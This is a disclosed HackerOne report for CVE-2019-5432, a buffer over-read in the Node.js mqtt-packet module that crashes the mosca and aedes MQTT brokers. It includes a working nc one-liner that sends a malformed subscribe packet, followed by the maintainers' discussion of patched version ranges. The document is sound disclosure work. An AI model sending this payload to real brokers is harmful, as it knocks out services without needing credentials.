---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/buffer-over-read
  - env/network
  - stack/node
  - vuln/dos
substate: "resolved"
weakness: "Buffer Over-read"
enriched: true
body: true
date: 2019-04-28
submitted: 2019-04-17T15:00:31.503Z
bounty_usd: null
votes: 3
cve: "CVE-2019-5432"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "lxndr"
source: "https://hackerone.com/reports/541354"
title: "A specifically malformed MQTT Subscribe packet crashes MQTT Brokers using the mqtt-packet module for decoding  "
---
# A specifically malformed MQTT Subscribe packet crashes MQTT Brokers using the mqtt-packet module for decoding  

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 3 | **Program:** Node.js third-party modules | **Disclosed:** 2019-04-28

- Report: [https://hackerone.com/reports/541354](https://hackerone.com/reports/541354)
- CWE: Buffer Over-read | CVE: CVE-2019-5432
- Submitted: 2019-04-17T15:00:31.503Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a buffer over-read in mqtt-packet respectively BufferList module.
It allows triggering an out of range read on a buffer which throws a RangeError. MQTT Brokers like mosca and aedes using this module can be forced to crash by sending a specifically malformed MQTT Subscribe packet. 

# Module

**module name:** mqtt-packet
**version:** 6.1.1
**npm page:** `https://www.npmjs.com/package/mqtt-packet`

## Module Description

Encode and Decode MQTT 3.1.1, 5.0 packets the node way.

## Module Stats

114,635 weekly downloads

# Vulnerability

## Vulnerability Description

From the original E-Mail to the Author:
*Hey Matteo,
while playing around with mosca/aedes and our fuzzing approach from IoT-Testware, I discovered some flaws which cause mosca/aedes to crash. Though, I assume the reasons originate from the mqtt-packet respectively bl modules. 
I didn't open an issue because the issue is IMHO quite critical. One could try to abuse to crash mosca/aedes without requiring any credentials, thus might lead to easy DoS attacks.
The malformed Subscribe Packet crashes mosca (v2.8.3) and aedes (v0.37.0), no valid credentials required.*

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

1. start either mosca or aedes MQTT Broker
2. shoot the following command against the Broker (on localhost)
  * `echo -ne '\x104\x00\x04MQTT\x04\xc2\x00\xff\x00\x19alicedoesnotneedaclientid\x00\x05alice\x00\x06secret\x82\x19\xa5\xa6\x00\x15hello/topic/of/alice\x00' | nc localhost 1883`
  * the sent byte string contains 2 accumulated MQTT Packets. The second packet is a subscribe packet and is processed in any case and the Broker's Auth mechanisms are undermined.

## Patch

Please find a GitHub patch attached.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 18.04.2 LTS
- nodejs -v `v6.17.1`
- npm -v `3.10.10`

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can harm the availability of MQTT services which are using these modules.

## Timeline

- **Report Filed**
- **2019-04-17** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **Report Triaged**
- **2019-04-17** @lirantal: Hi @lxndr,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.
I invited Matteo to the issue to confirm, and coordinate a fix.
- **2019-04-17** @lirantal: @mcollina can you confirm which versions are vulnerable and which has the fix? (hopefully a patch version if the fix doesn't break anything or adds any other functionality)

We should probably let the report stay undisclosed for a week or two until enough users adopt the new version and then I'll disclose and request a CVE.
- **External User Joined**
- **2019-04-17** @mcollina: All release lines of mqtt-packet are vulnerable.
I'm planning to patch as many as I can, because there are some old dependency chains. As an example, mqtt@1 uses mqtt-packet 3.x https://github.com/mqttjs/MQTT.js/blob/v1.14.1/package.json#L56.
- **2019-04-17** @lirantal: Understood. I can see that this dates quite a few years back too.
- **2019-04-17** @mcollina: This has been fixed in v3.5.1, v4.1.3, v5.6.1, v6.1.2 (latest).
All other releases are vulnerable
- **2019-04-17** @mcollina: Feel free to disclose whenever you prefer.
- **2019-04-18** @lirantal: @mcollina does the following version range seems right:
vulnerable: <3.5.1 || >=4.0.0 <4.1.3 || >=5.0.0 <5.6.1 || >=6.0.0 <6.1.2
patched: >=3.5.1 <4.0.0 || >=4.1.3 <5.0.0 || >=5.6.1 <6.0.0 || >=6.1.2

@lxndr can you please confirm the fix?
- **2019-04-18** @mcollina: Given that the code has been extracted from MQTT.js long ago, this vulnerability applies to mqtt < 1.0.0 as well.
- **2019-04-18** @lirantal: Good point to have here in the report when it gets disclosed. We don't have reports for consumers of each library but perhaps MQTT.js is a different case as the code used to live there. Seems that 1.0.0 branch is quite old so we can do one of:
1. Add a security disclosure to the MQTT.js library README/GitHub page with regards to versions affected (such as the <1.0.0)
2. Submit a new report for the affected MQTT.js versions 

(2) is probably the better way of doing it if you or @lxndr are up for another vulnerability report.
- **2019-04-18** @mcollina: I think 2 is the best option. The recommendation in that case is "upgrade".
- **2019-04-18** @lirantal: Indeed 👍
- **2019-04-18** @lxndr: sorry for the delayed response.

@lirantal confirmed 👍

*We should probably let the report stay undisclosed for a week or two until enough users adopt the new version and then I'll disclose and request a CVE.*

It's no rush for disclosure from my side. 
Option 2 sounds feasible. I'll prefer to let @mcollina go ahead with a subsequent report or whatever is required.
- **2019-04-18** @lirantal: Thanks!
Sounds good
- **2019-04-18** @mcollina: I will not have time to do a report on MQTT.js for the next few weeks - I'm on vacation and then at Build.
- **2019-04-20** @lxndr: Okay, no problem. We have also vacation time over here. 
But I will have time on Tuesday to write a new one. 

Just to confirm, the final affected MQTT.js versions are
vulnerable: <1.0.0 || <3.5.1 || >=4.0.0 <4.1.3 || >=5.0.0 <5.6.1 || >=6.0.0 <6.1.2
right?
- **2019-04-20** @mcollina: No, these are two modules:

[mqtt](http://npm.im/mqtt): <1.0.0

[mqtt-packet](http://npm.im/mqtt-packet): <3.5.1 || >=4.0.0 <4.1.3 || >=5.0.0 <5.6.1 || >=6.0.0 <6.1.2
- **2019-04-23** @lxndr: I've checked the mqtt.js v0.3.13 (examples/server/orig.js) module today and couldn't reproduce the crash there.

I found a note in [MQTT.js/parse.js](https://github.com/mqttjs/MQTT.js/blob/v0.3.13/lib/parse.js#L156) which points to possible errors here.
However, the parser does also here over-read the buffer but does not crash. It simply complains later while trying to send the corresponding suback (as the granted QoS is undefined).

Here some log output from around [Line 156](https://github.com/mqttjs/MQTT.js/blob/v0.3.13/lib/parse.js#L156)
```
CONNECT: client id: alicedoesnotneedaclientid
<Topic> hello/topic/of/alice
<Parser Pos> 25 <Buffer Length> 25
<QoS from Buffer> undefined
```
On the other hand, [mqtt-packet](https://github.com/mqttjs/mqtt-packet/blob/v1.0.0/lib/parser.js#L288) contains the malicious line since v1.0.0 (where it uses `readUInt8` function to read that byte)

So I assume, the bug was introduced with [MQTT.js v1.0.0](https://github.com/mqttjs/MQTT.js/releases/tag/v1.0.0) where [MQTT.js/parse.js](https://github.com/mqttjs/MQTT.js/blob/v0.3.13/lib/parse.js#L156) was moved to a separate module [mqtt-packet/parser.js](https://github.com/mqttjs/mqtt-packet/blob/v1.0.0/lib/parser.js#L288). 
Thus, [mqtt](https://www.npmjs.com/package/mqtt) <1.0.0 does not seem to be affected by this vulnerability.
- **2019-04-28** @lirantal: As I'm disclosing this report the vulnerability for MQTT.js 1.0.0 will be public as well. @lxndr will you send a report for that? (seems to be affecting MQTT.js == 1.0.0 only from your last update)
- **Changed Scope**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2019-04-29** @lxndr: MQTT.js 1.0.0 uses mqtt-packet 3.5.1 which already contains the fix and thus should be vulnerable anymore.

Shooting the malformed packet against MQTT.js 1.0.0 with mqtt-packet 3.5.1:
```
CONNECT: client id: alicedoesnotneedaclientid
Error: Malformed Subscribe Payload
    at Parser._parseSubscribe (~/MQTT/Brokers/MQTT.js/node_modules/mqtt-packet/parser.js:291:60)
    at Parser._parsePayload (~/MQTT/Brokers/MQTT.js/node_modules/mqtt-packet/parser.js:124:14)
```

I'd say MQTT.js <1.0.0 is prone to buffer over-read at the same position ([L155-156](https://github.com/mqttjs/MQTT.js/blob/v0.3.13/lib/parse.js#L155-156)). 
But sending the same malformed packet does not crash the Broker. But it does break the protocol logic. 
However, this does not break immediately but might cause problems under specific scenarios later on. I will open a new report for MQTT.js < 1.0.0 if I find such a scenario.
- **2019-04-29** @lirantal: thanks, sounds good!
